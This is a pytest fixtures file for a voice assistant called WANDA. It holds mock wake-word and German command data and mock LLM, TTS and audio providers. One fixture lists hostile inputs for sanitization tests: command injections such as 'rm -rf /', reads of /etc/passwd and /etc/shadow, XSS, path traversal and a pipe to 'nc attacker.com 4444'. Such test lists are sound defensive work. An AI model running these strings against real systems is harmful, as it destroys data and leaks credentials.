"""Shared test fixtures and utilities for WANDA Voice Core."""

import sys
import time
import random
import pytest
from pathlib import Path
from unittest.mock import Mock, MagicMock, patch
from typing import Dict, List, Any, Optional

# Ensure wanda_voice_core is importable
sys.path.insert(0, str(Path(__file__).parent.parent))


# =============================================================================
# MOCK DATA FIXTURES
# =============================================================================


@pytest.fixture
def mock_audio_data():
    """Generate mock audio data for testing."""
    return {
        "sample_rate": 16000,
        "channels": 1,
        "duration": 3.0,
        "data": bytes([0] * 16000 * 3 * 2),  # 3 seconds of silence (16-bit)
    }


@pytest.fixture
def mock_wake_word_variations():
    """Variations of wake words that should trigger detection."""
    return {
        "exact": ["wanda", "Wanda", "WANDA"],
        "phonetic": ["wander", "wanderer", "waller", "vanda", "wanta"],
        "noisy": ["wanda!", "wanda.", "wanda?", "...wanda..."],
    }


@pytest.fixture
def mock_false_positives():
    """Words that should NOT trigger wake word detection."""
    return [
        "wonder",
        "winter",
        "water",
        "wedding",
        "wallet",
        "waffle",
        "waffle",
        "wasp",
        "warranty",
        "warrior",
        "hello",
        "world",
        "computer",
        "test",
        "example",
    ]


@pytest.fixture
def mock_confirmation_commands():
    """German send command variations."""
    return {
        "send": [
            "abschicken",
            "abschike",
            "abschik",
            "schick",
            "schicke",
            "senden",
            "sende",
            "bestätigen",
            "bestätige",
            "ja",
            "yes",
        ],
        "cancel": [
            "abbrechen",
            "abbruch",
            "stop",
            "stopp",
            "nein",
            "no",
            "cancel",
            "abbruch",
        ],
        "read": ["vorlesen", "lesen", "read", "vorles", "les"],
    }


@pytest.fixture
def mock_dangerous_inputs():
    """Potentially dangerous inputs that should be sanitized."""
    return [
        "; rm -rf /",
        "$(whoami)",
        "`cat /etc/passwd`",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "|| cat /etc/shadow",
        "&& rm -rf ~",
        "| nc attacker.com 4444",
    ]


@pytest.fixture
def mock_voice_commands():
    """Sample voice commands for testing."""
    return {
        "open": ["öffne firefox", "starte editor", "öffne terminal", "starte chrome"],
        "close": ["schließe firefox", "beende editor", "schließe terminal"],
        "search": ["suche nach python", "finde datei test.py", "suche im web"],
        "system": ["status", "hilfe", "was kannst du", "wer bist du"],
    }


# =============================================================================
# MOCK PROVIDERS
# =============================================================================


class MockGeminiProvider:
    """Mock Gemini provider for testing."""

    def __init__(self, fail_rate: float = 0.0, latency: float = 0.01):
        self.fail_rate = fail_rate
        self.latency = latency
        self.call_count = 0
        self.call_history: List[str] = []

    def generate(self, prompt: str, **kwargs) -> Mock:
        """Mock generate method."""
        self.call_count += 1
        self.call_history.append(prompt)

        # Simulate latency
        if self.latency > 0:
            time.sleep(self.latency)

        # Simulate failures
        if random.random() < self.fail_rate:
            raise Exception("429 Too Many Requests")

        response = Mock()
        response.text = f"Mock response for: {prompt[:50]}..."
        response.source = "gemini"
        return response

    def reset(self):
        """Reset mock state."""
        self.call_count = 0
        self.call_history.clear()


class MockOllamaProvider:
    """Mock Ollama provider for testing."""

    def __init__(self, model: str = "test-model"):
        self.model = model
        self.call_count = 0

    def generate(self, prompt: str, system: Optional[str] = None) -> str:
        """Mock generate method."""
        self.call_count += 1
        return f"Processed: {prompt}"

    def chat(self, messages: List[Dict]) -> str:
        """Mock chat method."""
        self.call_count += 1
        return "Mock chat response"


class MockTTSProvider:
    """Mock TTS provider for testing."""

    def __init__(self, speed: float = 1.0):
        self.speed = speed
        self.speak_count = 0
        self.last_text = ""

    def speak(self, text: str) -> bool:
        """Mock speak method."""
        self.speak_count += 1
        self.last_text = text
        return True

    def stop(self):
        """Mock stop method."""
        pass


@pytest.fixture
def mock_gemini_provider():
    """Provide a mock Gemini provider."""
    return MockGeminiProvider()


@pytest.fixture
def mock_ollama_provider():
    """Provide a mock Ollama provider."""
    return MockOllamaProvider()


@pytest.fixture
def mock_tts_provider():
    """Provide a mock TTS provider."""
    return MockTTSProvider()


# =============================================================================
# MOCK AUDIO COMPONENTS
# =============================================================================


class MockAudioRecorder:
    """Mock audio recorder for testing."""

    def __init__(self, silence_timeout: float = 2.5, max_duration: float = 30.0):
        self.silence_timeout = silence_timeout
        self.max_duration = max_duration
        self.is_recording = False
        self.silence_detected = False
        self.recorded_duration = 0.0

    def record(self, duration: Optional[float] = None) -> bytes:
        """Mock record method."""
        self.is_recording = True
        record_duration = duration or self.max_duration
        self.recorded_duration = min(record_duration, self.max_duration)

        # Simulate recording time
        time.sleep(0.01)

        self.is_recording = False
        return bytes([0] * int(16000 * self.recorded_duration * 2))

    def record_with_silence_detection(self) -> bytes:
        """Mock record with silence detection."""
        self.is_recording = True

        # Simulate silence detection
        time.sleep(self.silence_timeout)
        self.silence_detected = True

        self.is_recording = False
        return bytes([0] * int(16000 * self.silence_timeout * 2))

    def stop(self):
        """Stop recording."""
        self.is_recording = False

    def _is_mic_muted(self) -> bool:
        """Check if mic is muted (mock)."""
        return False


class MockVAD:
    """Mock Voice Activity Detector."""

    def __init__(self, threshold: float = 0.5):
        self.threshold = threshold
        self.is_speech_count = 0

    def is_speech(self, audio_chunk: bytes) -> bool:
        """Mock speech detection."""
        self.is_speech_count += 1
        # Simulate speech detection (random for testing)
        return random.random() > 0.3

    def reset(self):
        """Reset VAD state."""
        self.is_speech_count = 0


@pytest.fixture
def mock_audio_recorder():
    """Provide a mock audio recorder."""
    return MockAudioRecorder()


@pytest.fixture
def mock_vad():
    """Provide a mock VAD."""
    return MockVAD()


# =============================================================================
# TEST UTILITIES
# =============================================================================


def assert_execution_time(func, max_time_ms: float, *args, **kwargs):
    """Assert that a function executes within a time limit."""
    start = time.perf_counter()
    result = func(*args, **kwargs)
    elapsed_ms = (time.perf_counter() - start) * 1000

    assert elapsed_ms < max_time_ms, (
        f"Execution too slow: {elapsed_ms:.2f}ms (max: {max_time_ms}ms)"
    )
    return result


def generate_test_audio(duration: float, sample_rate: int = 16000) -> bytes:
    """Generate test audio data of specified duration."""
    num_samples = int(sample_rate * duration)
    return bytes([0] * num_samples * 2)  # 16-bit audio


# =============================================================================
# PYTEST CONFIGURATION
# =============================================================================


def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "e2e: marks tests as end-to-end tests")
    config.addinivalue_line("markers", "performance: marks tests as performance tests")
    config.addinivalue_line("markers", "regression: marks tests as regression tests")
    config.addinivalue_line("markers", "unit: marks tests as unit tests")


# =============================================================================
# AUDIO TEST SAMPLES CONFIGURATION
# =============================================================================

TEST_AUDIO_SAMPLES = {
    "wake_word": [
        "wanda_clear.wav",
        "wanda_noisy.wav",
        "wander_variation.wav",
        "wanderer_variation.wav",
        "vanda_variation.wav",
    ],
    "commands": [
        "abschicken_clear.wav",
        "abschicken_muffled.wav",
        "stop_command.wav",
        "cancel_command.wav",
        "bestaetigen_command.wav",
    ],
    "background_noise": [
        "typing_noise.wav",
        "music_background.wav",
        "conversation_bg.wav",
        "silence.wav",
    ],
    "edge_cases": [
        "empty.wav",
        "very_short.wav",
        "very_long.wav",
        "corrupted.wav",
    ],
}


# =============================================================================
# PERFORMANCE THRESHOLDS
# =============================================================================

PERFORMANCE_THRESHOLDS = {
    "wake_word_detection_ms": 100,
    "command_parsing_ms": 50,
    "audio_recording_init_ms": 200,
    "tts_response_ms": 500,
    "provider_fallback_ms": 1000,
    "memory_usage_mb": 500,
}
